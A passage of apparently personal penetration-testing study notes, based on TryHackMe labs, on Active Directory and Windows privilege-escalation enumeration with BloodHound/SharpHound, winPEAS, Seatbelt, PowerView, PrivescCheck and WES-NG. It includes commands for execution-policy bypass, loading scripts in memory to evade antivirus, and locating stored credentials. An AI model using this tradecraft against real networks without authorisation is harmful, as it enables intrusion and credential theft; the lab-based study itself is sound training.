PS C:\> Set-ADAccountPassword -Identity gordon.stevens -Server za.tryhackme.com -OldPassword (ConvertTo-SecureString -AsPlaintext "old" -force) -NewPassword (ConvertTo-SecureString -AsPlainText "new" -Force)
```
Remember to change the identity value and password for the account you were provided with for enumeration on the distributor webpage in Task 1.

Benefits

*    The PowerShell cmdlets can enumerate significantly more information than the net commands from Command Prompt.
*    We can specify the server and domain to execute these commands using runas from a non-domain-joined machine.
*    We can create our own cmdlets to enumerate specific information.
*     We can use the AD-RSAT cmdlets to directly change AD objects, such as resetting passwords or adding a user to a specific group.

Drawbacks

*    PowerShell is often monitored more by the blue teams than Command Prompt.
*    We have to install the AD-RSAT tooling or use other, potentially detectable, scripts for PowerShell enumeration.

### Enumeration through Bloodhound
we will now look at performing AD enumeration using Bloodhound.
```
https://github.com/BloodHoundAD/BloodHound
```
Bloodhound is the most powerful AD enumeration tool to date, and when it was released in 2016, it changed the AD enumeration landscape forever. 

#### Bloodhound History

For a significant amount of time, red teamers (and, unfortunately, attackers) had the upper hand. So much so that Microsoft integrated their own version of Bloodhound in its Advanced Threat Protection solution. It all came down to the following phrase:

"Defenders think in lists, Attackers think in graphs." - Unknown

Bloodhound allowed attackers (and by now defenders too) to visualise the AD environment in a graph format with interconnected nodes. Each connection is a possible path that could be exploited to reach a goal. In contrast, the defenders used lists, like a list of Domain Admins or a list of all the hosts in the environment.

This graph-based thinking opened up a world to attackers. It allowed for a two-stage attack. In the first stage, the attackers would perform phishing attacks to get an initial entry to enumerate AD information. This initial payload was usually incredibly noisy and would be detected and contained by the blue team before the attackers could perform any actions apart from exfiltrating the enumerated data. However, the attackers could now use this data offline to create an attack path in graph format, showing precisely the steps and hops required. Using this information during the second phishing campaign, the attackers could often reach their goal in minutes once a breach was achieved. It is often even faster than it would take the blue team to receive their first alert. This is the power of thinking in graphs, which is why so many blue teams have also started to use these types of tools to understand their security posture better.

#### Sharphound

You will often hear users refer to Sharphound and Bloodhound interchangeably. However, they are not the same. Sharphound is the enumeration tool of Bloodhound. It is used to enumerate the AD information that can then be visually displayed in Bloodhound. Bloodhound is the actual GUI used to display the AD attack graphs. Therefore, we first need to learn how to use Sharphound to enumerate AD before we can look at the results visually using Bloodhound.

There are three different Sharphound collectors:

*    Sharphound.ps1 - PowerShell script for running Sharphound. However, the latest release of Sharphound has stopped releasing the Powershell script version. This version is good to use with RATs since the script can be loaded directly into memory, evading on-disk AV scans.
*    Sharphound.exe - A Windows executable version for running Sharphound.
*    AzureHound.ps1 - PowerShell script for running Sharphound for Azure (Microsoft Cloud Computing Services) instances. Bloodhound can ingest data enumerated from Azure to find attack paths related to the configuration of Azure Identity and Access Management.

Note: Your Bloodhound and Sharphound versions must match for the best results. Usually there are updates made to Bloodhound which means old Sharphound results cannot be ingested. This network was created using Bloodhound v4.1.0. Please make sure to use this version with the Sharphound results.

When using these collector scripts on an assessment, there is a high likelihood that these files will be detected as malware and raise an alert to the blue team. This is again where our Windows machine that is non-domain-joined can assist. We can use the runas command to inject the AD credentials and point Sharphound to a Domain Controller. Since we control this Windows machine, we can either disable the AV or create exceptions for specific files or folders, which has already been performed for you on the THMJMP1 machine. You can find the Sharphound binaries on this host in the C:\Tools\ directory. We will use the SharpHound.exe version for our enumeration, but feel free to play around with the other two. We will execute Sharphound as follows:
```
Sharphound.exe --CollectionMethods <Methods> --Domain za.tryhackme.com --ExcludeDCs
```
Parameters explained:

*    CollectionMethods - Determines what kind of data Sharphound would collect. The most common options are Default or All. Also, since Sharphound caches information, once the first run has been completed, you can only use the Session collection method to retrieve new user sessions to speed up the process.
*    Domain - Here, we specify the domain we want to enumerate. In some instances, you may want to enumerate a parent or other domain that has trust with your existing domain. You can tell Sharphound which domain should be enumerated by altering this parameter.
*    ExcludeDCs -This will instruct Sharphound not to touch domain controllers, which reduces the likelihood that the Sharphound run will raise an alert.

You can find all the various Sharphound parameters here.
```
https://bloodhound.readthedocs.io/en/latest/data-collection/sharphound-all-flags.html
```
It is good to overview the other parameters since they may be required depending on your red team assessment circumstances.

We will run Sharphound using the All and Session collection methods:
```
PS C:\Users\gordon.stevens\Documents\>SharpHound.exe --CollectionMethods All --Domain za.tryhackme.com --ExcludeDCs
```
It will take about 1 minute for Sharphound to perform the enumeration. In larger organisations, this can take quite a bit longer, even hours to execute for the first time. Once completed, you will have a timestamped ZIP file in the same folder you executed Sharphound from. 

```
PS C:\Users\gordon.stevens\Documents> dir

    Directory: C:\Users\gordon.stevens\Documents

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        3/16/2022   7:12 PM         121027 20220316191229_BloodHound.zip
-a----        3/16/2022   5:19 PM         906752 SharpHound.exe
-a----        3/16/2022   7:12 PM         360355 YzE4MDdkYjAtYjc2MC00OTYyLTk1YTEtYjI0NjhiZmRiOWY1.bin 
```
We can now use Bloodhound to ingest this ZIP to show us attack paths visually.
  
#### Bloodhound

As mentioned before, Bloodhound is the GUI that allows us to import data captured by Sharphound and visualise it into attack paths. Bloodhound uses Neo4j as its backend database and graphing system. Neo4j is a graph database management system. If you're using the AttackBox, you may use the red Bloodhound icon in the Dock to launch it. In all other cases, make sure Bloodhound and neo4j are installed and configured on your attacking machine. Either way, it is good to understand what happens in the background. Before we can start Bloodhound, we need to load Neo4j:
```
neo4j console start
```
In another Terminal tab, run bloodhound --no-sandbox. This will show you the authentication GUI:
![image](https://user-images.githubusercontent.com/24814781/187791728-958ac8dd-b16a-4986-b3a2-8a768f4017e7.png)

The default credentials for the neo4j database will be
```
neo4j:neo4j
```
Use this to authenticate in Bloodhound. To import our results, you will need to recover the ZIP file from the Windows host. The simplest way is to use SCP command on your AttackBox:
```
scp <AD Username>@<ip>:C:/Users/<AD Username>/Documents/<Sharphound ZIP> .
```
Once you provide your password, this will copy the results to your current working directory. Drag and drop the ZIP file onto the Bloodhound GUI to import into Bloodhound. It will show that it is extracting the files and initiating the import.

![image](https://user-images.githubusercontent.com/24814781/187791878-b78bbd7c-e731-4204-9457-0ffa1787aab5.png)
Once all JSON files have been imported, we can start using Bloodhound to enumerate attack paths for this specific domain.

#### Attack Paths

There are several attack paths that Bloodhound can show. Pressing the three stripes next to "Search for a node" will show the options. The very first tab shows us the information regarding our current imports. 
![image](https://user-images.githubusercontent.com/24814781/187791921-07391ddc-2026-49a5-bd1e-65dac057c981.png)

Note that if you import a new run of Sharphound, it would cumulatively increase these counts. First, we will look at Node Info. Let's search for our AD account in Bloodhound. You must click on the node to refresh the view. Also note you can change the label scheme by pressing LeftCtrl.
![image](https://user-images.githubusercontent.com/24814781/187791958-da3fde46-de35-47d9-9079-57e38a95d425.png)

We can see that there is a significant amount of information returned regarding our use. Each of the categories provides the following information:

*    Overview - Provides summaries information such as the number of active sessions the account has and if it can reach high-value targets.
*    Node Properties - Shows information regarding the AD account, such as the display name and the title.
*    Extra Properties - Provides more detailed AD information such as the distinguished name and when the account was created.
*    Group Membership - Shows information regarding the groups that the account is a member of.
*    Local Admin Rights - Provides information on domain-joined hosts where the account has administrative privileges.
*    Execution Rights - Provides information on special privileges such as the ability to RDP into a machine.
*    Outbound Control Rights - Shows information regarding AD objects where this account has permissions to modify their attributes.
*    Inbound Control Rights -  Provides information regarding AD objects that can modify the attributes of this account.

If you want more information in each of these categories, you can press the number next to the information query. For instance, let's look at the group membership associated with our account. By pressing the number next to "First Degree Group Membership", we can see that our account is a member of two groups.

![image](https://user-images.githubusercontent.com/24814781/187792012-a48ac062-654e-4746-8485-a4683e55ed58.png)

Next, we will be looking at the Analysis queries. These are queries that the creators of Bloodhound have written themselves to enumerate helpful information.

![image](https://user-images.githubusercontent.com/24814781/187792040-99869441-81dc-4636-b7b4-499b0c44c686.png)

Under the Domain Information section, we can run the Find all Domain Admins query. Note that you can press LeftCtrl to change the label display settings.
![image](https://user-images.githubusercontent.com/24814781/187792072-f2e36478-3c3b-4f11-8d78-5cc25602edd0.png)

The icons are called nodes, and the lines are called edges. Let's take a deeper dive into what Bloodhound is showing us. There is an AD user account with the username of T0_TINUS.GREEN, that is a member of the group Tier 0 ADMINS. But, this group is a nested group into the DOMAIN ADMINS group, meaning all users that are part of the Tier 0 ADMINS group are effectively DAs.

Furthermore, there is an additional AD account with the username of ADMINISTRATOR that is part of the DOMAIN ADMINS group. Hence, there are two accounts in our attack surface that we can probably attempt to compromise if we want to gain DA rights. Since the ADMINISTRATOR account is a built-in account, we would likely focus on the user account instead.

Each AD object that was discussed in the previous tasks can be a node in Bloodhound, and each will have a different icon depicting the type of object it is. If we want to formulate an attack path, we need to look at the available edges between the current position and privileges we have and where we want to go. Bloodhound has various available edges that can be accessed by the filter icon:
![image](https://user-images.githubusercontent.com/24814781/187792106-a0b49fd4-4f61-4fbe-841f-854cb599c1cb.png)

These are also constantly being updated as new attack vectors are discovered. We will be looking at exploiting these different edges in a future network. However, let's look at the most basic attack path using only the default and some special edges. We will run a search in Bloodhound to enumerate the attack path. Press the path icon to allow for path searching.
![image](https://user-images.githubusercontent.com/24814781/187792128-010b72fc-bdd6-4067-9eeb-cf2708affb34.png)

Our Start Node would be our AD username, and our End Node will be the Tier 1 ADMINS group since this group has administrative privileges over servers.
![image](https://user-images.githubusercontent.com/24814781/187792143-411f4680-3603-4cd3-a53b-ce01e43ad6f5.png)

If there is no available attack path using the selected edge filters, Bloodhound will display "No Results Found". Note, this may also be due to a Bloodhound/Sharphound mismatch, meaning the results were not properly ingested. Please make use of Bloodhound v4.1.0. However, in our case, Bloodhound shows an attack path. It shows that one of the T1 ADMINS, ACCOUNT,  broke the tiering model by using their credentials to authenticate to THMJMP1, which is a workstation. It also shows that any user that is part of the DOMAIN USERS group, including our AD account, has the ability to RDP into this host. 

This is a straightforward example. The attack paths may be relatively complex in normal circumstances and require several actions to reach the final goal. If you are interested in the exploits associated with each edge, the following Bloodhound documentation
```
https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html
```
provides an excellent guide. Bloodhound is an incredibly powerful AD enumeration tool that provides in-depth insights into the AD structure of an attack surface. It is worth the effort to play around with it and learn its various features.

#### Session Data Only
The structure of AD does not change very often in large organisations. There may be a couple of new employees, but the overall structure of OUs, Groups, Users, and permission will remain the same.

However, the one thing that does change constantly is active sessions and LogOn events. Since Sharphound creates a point-in-time snapshot of the AD structure, active session data is not always accurate since some users may have already logged off their sessions or new users may have established new sessions. This is an essential thing to note and is why we would want to execute Sharphound at regular intervals.

A good approach is to execute Sharphound with the "All" collection method at the start of your assessment and then execute Sharphound at least twice a day using the "Session" collection method. This will provide you with new session data and ensure that these runs are faster since they do not enumerate the entire AD structure again. The best time to execute these session runs is at around 10:00, when users have their first coffee and start to work and again around 14:00, when they get back from their lunch breaks but before they go home.

You can clear stagnant session data in Bloodhound on the Database Info tab by clicking the "Clear Session Information" before importing the data from these new Sharphound runs.

Benefits

*    Provides a GUI for AD enumeration.
*    Has the ability to show attack paths for the enumerated AD information.
*    Provides more profound insights into AD objects that usually require several manual queries to recover.

Drawbacks

*    Requires the execution of Sharphound, which is noisy and can often be detected by AV or EDR solutions.
  
### Enumeration through winpeas
## winpeas

ops: winpeas can give a bit of false positive so be aware.

winPEAS is a very powerful tool that not only actively
hunts for privilege escalation misconfigurations, but
highlights them for the user in the results.

WinPEAS is a script developed to enumerate the target system to uncover privilege escalation paths. You can find more information about winPEAS and download either the precompiled executable or a .bat script. WinPEAS will run commands similar to the ones listed in the previous task and print their output. The output from winPEAS can be lengthy and sometimes difficult to read. This is why it would be good practice to always redirect the output to a file, as shown below:
```
C:\> winpeas.exe > outputfile.txt
```
Windows Privilege Escalation Awesome Scripts
```
https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS
```
```
https://github.com/carlospolop/privilege-escalation-
awesome-scripts-suite/tree/master/winPEAS
```

if possible write this and then open up a new cmd
```
add HKCU\console /v VirtualTerminalLevel /t REG_DWORD /d 1 
```
open up a new cmd and start it 
linux:
```
.\winpeas.sh
```
either from ps or cmd windows: (the executable may be called something else but this is the basic)
```
.\winpeas.exe
```
obs: we do this because we enable colors wich makes it easier to find missconfoguration. 

if you cant add the registration key you may still being able to view colors by running the script in a reverse shell on a kali machin. 

winpeas runns a number of checks in different categories but not specifying any will execute all the checks. 

### Enumeration through seatbelt
Seatbelt is a C# project that performs a number of security oriented host-survey "safety checks" relevant from both offensive and defensive security perspectives. 
```
https://github.com/GhostPack/Seatbelt
```
```
https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/seatbelt
```

Available commands (+ means remote usage is supported):

    + AMSIProviders          - Providers registered for AMSI
    + AntiVirus              - Registered antivirus (via WMI)
    + AppLocker              - AppLocker settings, if installed
      ARPTable               - Lists the current ARP table and adapter information (equivalent to arp -a)
      AuditPolicies          - Enumerates classic and advanced audit policy settings
    + AuditPolicyRegistry    - Audit settings via the registry
    + AutoRuns               - Auto run executables/scripts/programs
      Certificates           - Finds user and machine personal certificate files
      CertificateThumbprints - Finds thumbprints for all certificate store certs on the systen
    + ChromiumBookmarks      - Parses any found Chrome/Edge/Brave/Opera bookmark files
    + ChromiumHistory        - Parses any found Chrome/Edge/Brave/Opera history files
    + ChromiumPresence       - Checks if interesting Chrome/Edge/Brave/Opera files exist
    + CloudCredentials       - AWS/Google/Azure/Bluemix cloud credential files
    + CloudSyncProviders     - All configured Office 365 endpoints (tenants and teamsites) which are synchronised by OneDrive.
      CredEnum               - Enumerates the current user's saved credentials using CredEnumerate()
    + CredGuard              - CredentialGuard configuration
      dir                    - Lists files/folders. By default, lists users' downloads, documents, and desktop folders (arguments == [directory] [maxDepth] [regex] [boolIgnoreErrors]
    + DNSCache               - DNS cache entries (via WMI)
    + DotNet                 - DotNet versions
    + DpapiMasterKeys        - List DPAPI master keys
      Dsregcmd               - Return Tenant information - Replacement for Dsregcmd /status
      EnvironmentPath        - Current environment %PATH$ folders and SDDL information
    + EnvironmentVariables   - Current environment variables
    + ExplicitLogonEvents    - Explicit Logon events (Event ID 4648) from the security event log. Default of 7 days, argument == last X days.
      ExplorerMRUs           - Explorer most recently used files (last 7 days, argument == last X days)
    + ExplorerRunCommands    - Recent Explorer "run" commands
      FileInfo               - Information about a file (version information, timestamps, basic PE info, etc. argument(s) == file path(s)
    + FileZilla              - FileZilla configuration files
    + FirefoxHistory         - Parses any found FireFox history files
    + FirefoxPresence        - Checks if interesting Firefox files exist
    + Hotfixes               - Installed hotfixes (via WMI)
      IdleTime               - Returns the number of seconds since the current user's last input.
    + IEFavorites            - Internet Explorer favorites
      IETabs                 - Open Internet Explorer tabs
    + IEUrls                 - Internet Explorer typed URLs (last 7 days, argument == last X days)
    + InstalledProducts      - Installed products via the registry
      InterestingFiles       - "Interesting" files matching various patterns in the user's folder. Note: takes non-trivial time.
    + InterestingProcesses   - "Interesting" processes - defensive products and admin tools
      InternetSettings       - Internet settings including proxy configs and zones configuration
    + KeePass                - Finds KeePass configuration files
    + LAPS                   - LAPS settings, if installed
    + LastShutdown           - Returns the DateTime of the last system shutdown (via the registry).
      LocalGPOs              - Local Group Policy settings applied to the machine/local users
    + LocalGroups            - Non-empty local groups, "-full" displays all groups (argument == computername to enumerate)
    + LocalUsers             - Local users, whether they're active/disabled, and pwd last set (argument == computername to enumerate)
    + LogonEvents            - Logon events (Event ID 4624) from the security event log. Default of 10 days, argument == last X days.
    + LogonSessions          - Windows logon sessions
      LOLBAS                 - Locates Living Off The Land Binaries and Scripts (LOLBAS) on the system. Note: takes non-trivial time.
    + LSASettings            - LSA settings (including auth packages)
    + MappedDrives           - Users' mapped drives (via WMI)
      McAfeeConfigs          - Finds McAfee configuration files
      McAfeeSiteList         - Decrypt any found McAfee SiteList.xml configuration files.
      MicrosoftUpdates       - All Microsoft updates (via COM)
      NamedPipes             - Named pipe names, any readable ACL information and associated process information.
    + NetworkProfiles        - Windows network profiles
    + NetworkShares          - Network shares exposed by the machine (via WMI)
    + NTLMSettings           - NTLM authentication settings
      OfficeMRUs             - Office most recently used file list (last 7 days)
      OneNote                - List OneNote backup files
    + OptionalFeatures       - List Optional Features/Roles (via WMI)
      OracleSQLDeveloper     - Finds Oracle SQLDeveloper connections.xml files
    + OSInfo                 - Basic OS info (i.e. architecture, OS version, etc.)
    + OutlookDownloads       - List files downloaded by Outlook
    + PoweredOnEvents        - Reboot and sleep schedule based on the System event log EIDs 1, 12, 13, 42, and 6008. Default of 7 days, argument == last X days.
    + PowerShell             - PowerShell versions and security settings
    + PowerShellEvents       - PowerShell script block logs (4104) with sensitive data.
    + PowerShellHistory      - Searches PowerShell console history files for sensitive regex matches.
      Printers               - Installed Printers (via WMI)
    + ProcessCreationEvents  - Process creation logs (4688) with sensitive data.
      Processes              - Running processes with file info company names that don't contain 'Microsoft', "-full" enumerates all processes
    + ProcessOwners          - Running non-session 0 process list with owners. For remote use.
    + PSSessionSettings      - Enumerates PS Session Settings from the registry
    + PuttyHostKeys          - Saved Putty SSH host keys
    + PuttySessions          - Saved Putty configuration (interesting fields) and SSH host keys
      RDCManFiles            - Windows Remote Desktop Connection Manager settings files
    + RDPSavedConnections    - Saved RDP connections stored in the registry
    + RDPSessions            - Current incoming RDP sessions (argument == computername to enumerate)
    + RDPsettings            - Remote Desktop Server/Client Settings
      RecycleBin             - Items in the Recycle Bin deleted in the last 30 days - only works from a user context!
      reg                    - Registry key values (HKLM\Software by default) argument == [Path] [intDepth] [Regex] [boolIgnoreErrors]
      RPCMappedEndpoints     - Current RPC endpoints mapped
    + SCCM                   - System Center Configuration Manager (SCCM) settings, if applicable
    + ScheduledTasks         - Scheduled tasks (via WMI) that aren't authored by 'Microsoft', "-full" dumps all Scheduled tasks
      SearchIndex            - Query results from the Windows Search Index, default term of 'passsword'. (argument(s) == <search path> <pattern1,pattern2,...>
      SecPackageCreds        - Obtains credentials from security packages
      SecurityPackages       - Enumerates the security packages currently available using EnumerateSecurityPackagesA()
      Services               - Services with file info company names that don't contain 'Microsoft', "-full" dumps all processes
    + SlackDownloads         - Parses any found 'slack-downloads' files
    + SlackPresence          - Checks if interesting Slack files exist
    + SlackWorkspaces        - Parses any found 'slack-workspaces' files
    + SuperPutty             - SuperPutty configuration files
    + Sysmon                 - Sysmon configuration from the registry
    + SysmonEvents           - Sysmon process creation logs (1) with sensitive data.
      TcpConnections         - Current TCP connections and their associated processes and services
      TokenGroups            - The current token's local and domain groups
      TokenPrivileges        - Currently enabled token privileges (e.g. SeDebugPrivilege/etc.)
    + UAC                    - UAC system policies via the registry
      UdpConnections         - Current UDP connections and associated processes and services
      UserRightAssignments   - Configured User Right Assignments (e.g. SeDenyNetworkLogonRight, SeShutdownPrivilege, etc.) argument == computername to enumerate
      WifiProfile            - Enumerates the saved Wifi profiles and extract the ssid, authentication type, cleartext key/passphrase (when possible)
    + WindowsAutoLogon       - Registry autologon information
      WindowsCredentialFiles - Windows credential DPAPI blobs
    + WindowsDefender        - Windows Defender settings (including exclusion locations)
    + WindowsEventForwarding - Windows Event Forwarding (WEF) settings via the registry
    + WindowsFirewall        - Non-standard firewall rules, "-full" dumps all (arguments == allow/deny/tcp/udp/in/out/domain/private/public)
      WindowsVault           - Credentials saved in the Windows Vault (i.e. logins from Internet Explorer and Edge).
    + WMI                    - Runs a specified WMI query
      WMIEventConsumer       - Lists WMI Event Consumers
      WMIEventFilter         - Lists WMI Event Filters
      WMIFilterBinding       - Lists WMI Filter to Consumer Bindings
    + WSUS                   - Windows Server Update Services (WSUS) settings, if applicable


Seatbelt has the following command groups: All, User, System, Slack, Chromium, Remote, Misc

    You can invoke command groups with         "Seatbelt.exe <group>"


    Or command groups except specific commands "Seatbelt.exe <group> -Command"

   "Seatbelt.exe -group=all" runs all commands

   "Seatbelt.exe -group=user" runs the following commands:

        Certificates, CertificateThumbprints, ChromiumPresence, CloudCredentials, CloudSyncProviders,
        CredEnum, dir, DpapiMasterKeys, Dsregcmd,
        ExplorerMRUs, ExplorerRunCommands, FileZilla, FirefoxPresence,
        IdleTime, IEFavorites, IETabs, IEUrls,
        KeePass, MappedDrives, OfficeMRUs, OneNote,
        OracleSQLDeveloper, PowerShellHistory, PuttyHostKeys, PuttySessions,
        RDCManFiles, RDPSavedConnections, SecPackageCreds, SlackDownloads,
        SlackPresence, SlackWorkspaces, SuperPutty, TokenGroups,
        WindowsCredentialFiles, WindowsVault

   "Seatbelt.exe -group=system" runs the following commands:

        AMSIProviders, AntiVirus, AppLocker, ARPTable, AuditPolicies,
        AuditPolicyRegistry, AutoRuns, Certificates, CertificateThumbprints,
        CredGuard, DNSCache, DotNet, EnvironmentPath,
        EnvironmentVariables, Hotfixes, InterestingProcesses, InternetSettings,
        LAPS, LastShutdown, LocalGPOs, LocalGroups,
        LocalUsers, LogonSessions, LSASettings, McAfeeConfigs,
        NamedPipes, NetworkProfiles, NetworkShares, NTLMSettings,
        OptionalFeatures, OSInfo, PoweredOnEvents, PowerShell,
        Processes, PSSessionSettings, RDPSessions, RDPsettings,
        SCCM, Services, Sysmon, TcpConnections,
        TokenPrivileges, UAC, UdpConnections, UserRightAssignments,
        WifiProfile, WindowsAutoLogon, WindowsDefender, WindowsEventForwarding,
        WindowsFirewall, WMI, WMIEventConsumer, WMIEventFilter,
        WMIFilterBinding, WSUS

   "Seatbelt.exe -group=slack" runs the following commands:

        SlackDownloads, SlackPresence, SlackWorkspaces

   "Seatbelt.exe -group=chromium" runs the following commands:

        ChromiumBookmarks, ChromiumHistory, ChromiumPresence

   "Seatbelt.exe -group=remote" runs the following commands:

        AMSIProviders, AntiVirus, AuditPolicyRegistry, ChromiumPresence, CloudCredentials,
        DNSCache, DotNet, DpapiMasterKeys, EnvironmentVariables,
        ExplicitLogonEvents, ExplorerRunCommands, FileZilla, Hotfixes,
        InterestingProcesses, KeePass, LastShutdown, LocalGroups,
        LocalUsers, LogonEvents, LogonSessions, LSASettings,
        MappedDrives, NetworkProfiles, NetworkShares, NTLMSettings,
        OptionalFeatures, OSInfo, PoweredOnEvents, PowerShell,
        ProcessOwners, PSSessionSettings, PuttyHostKeys, PuttySessions,
        RDPSavedConnections, RDPSessions, RDPsettings, Sysmon,
        WindowsDefender, WindowsEventForwarding, WindowsFirewall

   "Seatbelt.exe -group=misc" runs the following commands:

        ChromiumBookmarks, ChromiumHistory, ExplicitLogonEvents, FileInfo, FirefoxHistory,
        InstalledProducts, InterestingFiles, LogonEvents, LOLBAS,
        McAfeeSiteList, MicrosoftUpdates, OutlookDownloads, PowerShellEvents,
        Printers, ProcessCreationEvents, ProcessOwners, RecycleBin,
        reg, RPCMappedEndpoints, ScheduledTasks, SearchIndex,
        SecurityPackages, SysmonEvents


Examples:
    'Seatbelt.exe <Command> [Command2] ...' will run one or more specified checks only
    'Seatbelt.exe <Command> -full' will return complete results for a command without any filtering.
    'Seatbelt.exe "<Command> [argument]"' will pass an argument to a command that supports it (note the quotes).
    'Seatbelt.exe -group=all' will run ALL enumeration checks, can be combined with "-full".
    'Seatbelt.exe -group=all -AuditPolicies' will run all enumeration checks EXCEPT AuditPolicies, can be combined with "-full".
    'Seatbelt.exe <Command> -computername=COMPUTER.DOMAIN.COM [-username=DOMAIN\USER -password=PASSWORD]' will run an applicable check remotely
    'Seatbelt.exe -group=remote -computername=COMPUTER.DOMAIN.COM [-username=DOMAIN\USER -password=PASSWORD]' will run remote specific checks
    'Seatbelt.exe -group=system -outputfile="C:\Temp\out.txt"' will run system checks and output to a .txt file.
    'Seatbelt.exe -group=user -q -outputfile="C:\Temp\out.json"' will run in quiet mode with user checks and output to a .json file.

### Enumeration through powerview
its in the powersploit github but donwload here:
```
https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1
```

#### resources
```
https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993
```
```
https://book.hacktricks.xyz/windows-hardening/basic-powershell-for-pentesters/powerview
```
```
https://zflemingg1.gitbook.io/undergrad-tutorials/powerview/powerview-cheatsheet
```
#### Introduction to PowerView

Powerview (part of PowerSploit by PowerShellMafia) is an excellent suite of tools that can be used for enumeration, and exploitation of an AD Domain, today we’re only going to cover Powerview’s ability to enumerate information about the domain and their associated trusts.


#### Get-NetDomain

Get-NetDomain is similar to the ActiveDirectory module’s Get-ADDomain but contains a lot less information, which can be better. Basic info such as the Forest, Domain Controllers, and Domain Name are enumerated.
```
Get-NetDomain
```
![image](https://user-images.githubusercontent.com/24814781/184441594-ffa9935c-7c7a-4862-8590-3c75510128e0.png)

#### Get-NetDomainController 

Get-NetDomainController is another useful cmdlet that will list all of the Domain Controllers within the network. This is incredibly useful for initial reconnaissance, especially if you do not have a Windows device that’s joined to the domain.
```
Get-NetDomainController    
```
![image](https://user-images.githubusercontent.com/24814781/184442195-b2251ed7-7c81-4828-bd1b-fbdb733f333f.png)

#### Get-NetForest

Get-NetForest is similar to Get-ADForest, and provides similar output. It provides all the associated Domains, the root domain, as well as the Domain Controllers for the root domain.
```
Get-NetForest      
```
![image](https://user-images.githubusercontent.com/24814781/184442205-9f67bada-211e-497f-823a-6375f000197b.png)

#### Get-NetDomainTrust

Get-NetDomainTrust is similar to Get-ADTrust with our SelectObject filter applied to it. It’s short, sweet and to the point!
```
Get-NetDomainTrust
```
![image](https://user-images.githubusercontent.com/24814781/184442213-10de5e2e-7ef7-4344-933a-52c7682f3ccb.png)

### Enumeration through PrivescCheck
PrivescCheck is a PowerShell script that searches common privilege escalation on the target system. It provides an alternative to WinPEAS without requiring the execution of a binary file.
  
PrivescCheck can be downloaded here:
```
https://github.com/itm4n/PrivescCheck
```

Reminder: To run PrivescCheck on the target system, you may need to bypass the execution policy restrictions. To achieve this, you can use the Set-ExecutionPolicy cmdlet as shown below.
```
PS C:\> Set-ExecutionPolicy Bypass -Scope process -Force
PS C:\> . .\PrivescCheck.ps1
PS C:\> Invoke-PrivescCheck
```


#### Basic usage
From a command prompt:
```
powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck"
```

From a PowerShell prompt:
```
Set-ExecutionPolicy Bypass -Scope process -Force
. .\PrivescCheck.ps1; Invoke-PrivescCheck
```

From a PowerShell prompt without modifying the execution policy:
```
Get-Content .\PrivescCheck.ps1 | Out-String | IEX
Invoke-PrivescCheck
```

#### Extended mode

By default, the scope is limited to vulnerability discovery but, you can get a lot more information with the -Extended option:
```
Invoke-PrivescCheck -Extended
```

#### Generate report files

You can use the -Report and -Format options to save the results of the script to files in various formats. Accepted formats are TXT, CSV, HTML and XML. If -Format is empty, the default format is TXT, which is a simple copy of what is printed on the terminal.

The value of -Report will be used as the base name for the final report, the extension will be automatically appended depending on the chosen format(s).
```
Invoke-PrivescCheck -Report PrivescCheck_%COMPUTERNAME%
Invoke-PrivescCheck -Report PrivescCheck_%COMPUTERNAME% -Format TXT,CSV,HTML,XML
```

### Enumeration through WES NG Windows Exploit Suggester the Next Generation
Some exploit suggesting scripts (e.g. winPEAS) will require you to upload them to the target system and run them there. This may cause antivirus software to detect and delete them. To avoid making unnecessary noise that can attract attention, you may prefer to use WES-NG, which will run on your attacking machine (e.g. Kali or TryHackMe AttackBox).

WES-NG is a Python script that can be found and downloaded here:
```
https://github.com/bitsadmin/wesng
```

Once installed, and before using it, type the wes.py --update command to update the database. The script will refer to the database it creates to check for missing patches that can result in a vulnerability you can use to elevate your privileges on the target system.

To use the script, you will need to run the systeminfo command on the target system. Do not forget to direct the output to a .txt file you will need to move to your attacking machine.

Once this is done, wes.py can be run as follows;
```
wes.py systeminfo.txt
```
or like this
```
# python wes.py systeminfo.txt -i 'Elevation
of Privilege' --exploits-only | less
```
same but if you have it installed do this and you have it on the same folder shared over smb you can do this in your own kali machin
```
# wes systeminfo.txt -i 'Elevation
of Privilege' --exploits-only | less
```
-------------------------------------------------------------------------------------

## AD focused Privilige Escalation and enumeration

![image](https://user-images.githubusercontent.com/24814781/181489538-3f33d6f4-1a7b-4933-a8dd-3d4958aabf14.png)


### AD resources
here is some basic resources about privilige escalation and enumeration to start with. 

```
https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation
```
```
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md
```
```
https://book.hacktricks.xyz/windows-hardening/checklist-windows-privilege-escalation
```


### basic  

Several scripts exist to conduct system enumeration in ways similar to the ones seen in the previous task. These tools can shorten the enumeration process time and uncover different potential privilege escalation vectors. However, please remember that automated tools can sometimes miss privilege escalation.

always start checking this two commands: 
```
whoami /priv
```
```
whoami /all
```

you can search in the user folder and automate every folder in the users folder and beyond:
```
gci -recurse .
```
obs: dont forget the dot since it says from the folder you are on etc. 

use the same command to search for hidden files:
```
cgi -hidden .
```
you can then after look for files etc under the root folder (C:\ drive) then the same on /temp folder

then go scan with seatbelt, winpeas and PrivescCheck then go over to enum with powerview.






### metasploit exploit suggester

If you already have a Meterpreter shell on the target system, you can use the multi/recon/local_exploit_suggester module to list vulnerabilities that may affect the target system and allow you to elevate your privileges on the target system.

in a Meterpreter shell
```
multi/recon/local_exploit_suggester
```

### powershell
#### Powershell Overview
Powershell is the Windows Scripting Language and shell environment that is built using the .NET framework.

This also allows Powershell to execute .NET functions directly from it's shell. Most Powershell commands, called cmdlets, are written in .NET. Unlike other scripting languages and shell environments, the output of these cmdlets and objects - making Powershell somewhat object oriented. This also means that running cmdlets allows you to perform actions on the output object (which makes it convenient to pass output from one cmdlet to another). The normal format of a cmdlet is represented using Verb-Noun; for example the cmdlet to list commands is Get-Command.

As an example of a history command, a PowerShell saves executed PowerShell commands in a history file in a user profile in the following path: 
```
C:\Users\<USER>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

It might be worth checking what users are working on or finding sensitive information. Another example would be finding interesting information. For example, the following command is to look for the "password" keyword in the Window registry.
```
